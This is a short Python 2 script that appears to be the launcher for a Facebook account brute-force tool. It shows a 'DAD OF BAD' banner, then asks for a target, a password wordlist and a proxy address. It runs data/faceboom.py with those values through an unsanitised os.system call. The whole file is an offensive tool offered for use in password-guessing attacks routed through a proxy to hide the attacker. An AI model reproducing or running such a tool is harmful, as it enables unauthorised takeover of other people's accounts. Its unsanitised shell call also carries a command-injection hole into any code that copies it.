import os,sys,time
os.system('clear')
time.sleep(0.3)

time.sleep(0.01)


print """\033[1;91m _____          _____     ____  ______   ____          _____"""

time.sleep(0.04)

print """\033[1;91m|  __ \   /\   |  __ \   / __ \|  ____| |  _ \   /\   |  __ \ """

time.sleep(0.04)

print  """\033[1;91m| |  | | /  \  | |  | | | |  | | |__    | |_) | /  \  | |  | |"""

time.sleep(0.04)

print  """\033[1;91m| |  | |/ /\ \ | |  | | | |  | |  __|   |  _ < / /\ \ | |  | |"""


time.sleep(0.04)


print """\033[1;91m| |__| / ____ \| |__| | | |__| | |      | |_) / ____ \| |__| |"""


time.sleep(0.04)


print """\033[1;91m|_____/_/    \_\_____/   \____/|_|      |____/_/    \_\_____/"""
time.sleep(0.4)



def jalan(z):
        for e in z + '\n':
                sys.stdout.write(e)
                sys.stdout.flush()
                time.sleep(0.02)

print """\033[1;93m--------------------------------------------------------------"""

jalan ( "\t \033[1;92m Tool Created By:-  ")
jalan ( "\t \033[1;92m                      Noyan Jani   ")

print """\033[1;93m--------------------------------------------------------------"""



print """Copy WordList to MAIN directory"""




tg = raw_input("TARGET>>>")
wrd = raw_input("WordList>>>")
p1 = raw_input("ProxyIp>>>")
p2 = raw_input("ProxyPort>>>")


#cmnd = "python2 faceboom.py -t %s -w %s -p %s:%s" %(tg ,wrd ,p1 ,p2)

cmnd = "python2 data/faceboom.py -t %s -w %s -p %s:%s" %(tg ,wrd ,p1 ,p2)


os.system(cmnd)
